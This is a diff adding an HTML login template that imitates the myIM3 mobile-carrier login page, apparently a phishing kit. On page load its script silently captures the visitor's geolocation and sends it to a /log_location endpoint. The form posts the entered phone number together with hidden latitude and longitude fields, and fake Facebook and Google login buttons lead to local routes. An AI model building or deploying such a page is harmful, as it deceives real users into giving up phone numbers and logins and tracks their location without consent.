@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>myIM3</title>
+    <link rel="icon" href="{{ url_for('static', filename='myim3.png') }}" type="image/x-icon">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style1.css') }}">
+    <script>
+        function sendLocation(event) {
+            event.preventDefault();
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    document.getElementById('latitude').value = position.coords.latitude;
+                    document.getElementById('longitude').value = position.coords.longitude;
+                    document.getElementById('login-form').submit();
+                });
+            } else {
+                console.log('Geolocation is not supported by this browser.');
+                document.getElementById('login-form').submit();
+            }
+        }
+
+        function logLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const data = new FormData();
+                    data.append('latitude', position.coords.latitude);
+                    data.append('longitude', position.coords.longitude);
+
+                    navigator.sendBeacon('/log_location', data);
+                });
+            }
+        }
+
+        window.onload = logLocation;
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Gunakan nomor IM3 untuk login ke myIM3</h1>
+        <form id="login-form" action="/submit" method="post" onsubmit="sendLocation(event)">
+            <label for="phone_number">Nomor IM3</label>
+            <input type="text" id="phone_number" name="phone_number" required>
+            <input type="hidden" id="latitude" name="latitude">
+            <input type="hidden" id="longitude" name="longitude">
+            <button class="submit" type="submit">LANJUTKAN</button>
+        </form>
+        <div class="social-login">
+            <button onclick="window.location.href='/facebook'">LANJUTKAN WITH FACEBOOK</button>
+            <button onclick="window.location.href='/google'">LANJUTKAN WITH GOOGLE</button>
+        </div>        
+        <div class="footer">
+            <p>Belum punya nomor IM3? <a href="#">Dapatkan starter pack IM3 sekarang</a></p>
+        </div>
+    </div>
+</body>
+</html>
